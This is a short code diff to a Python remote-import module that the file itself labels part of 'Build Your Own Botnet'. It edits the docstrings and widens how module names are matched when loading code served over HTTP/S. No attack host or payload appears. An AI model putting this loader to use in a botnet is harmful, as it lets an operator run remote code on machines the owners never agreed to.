@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Module Loader (Build Your Own Botnet)'
+'Remote Import (Build Your Own Botnet)'
 
 # standard library
 import imp
@@ -19,9 +19,8 @@ class RemoteImporter(object):
     """ 
     The class that implements the remote import API. Contains the "find_module" and "load_module" methods.
     The 'modules' parameter is a list, with the names of the modules/packages that can be imported from the given URL.
-    The 'base_url' parameter is a string containing the URL where the repository/directory is served through HTTP/S
+    :param str base_url: URL of directory/repository of modules being served through HTTPS
 
-    It is better to not use this class directly, but through its wrappers ('remote_repo', 'github_repo', etc) that automatically load and unload this class' objects to the 'sys.meta_path' list.
     """
 
     def __init__(self, modules, base_url):
@@ -35,7 +34,7 @@ class RemoteImporter(object):
         log(level='debug', info= "[!] Searching %s" % fullname)
         log(level='debug', info= "[!] Path is %s" % path)
         log(level='info', info= "[@] Checking if in declared remote module names >")
-        if fullname.split('.')[0] not in self.module_names:
+        if fullname.split('.')[0] not in self.module_names + list(set([_.split('.')[0] for _ in self.module_names])):
             log(level='info', info= "[-] Not found!")
             return None
         log(level='info', info= "[@] Checking if built-in >")
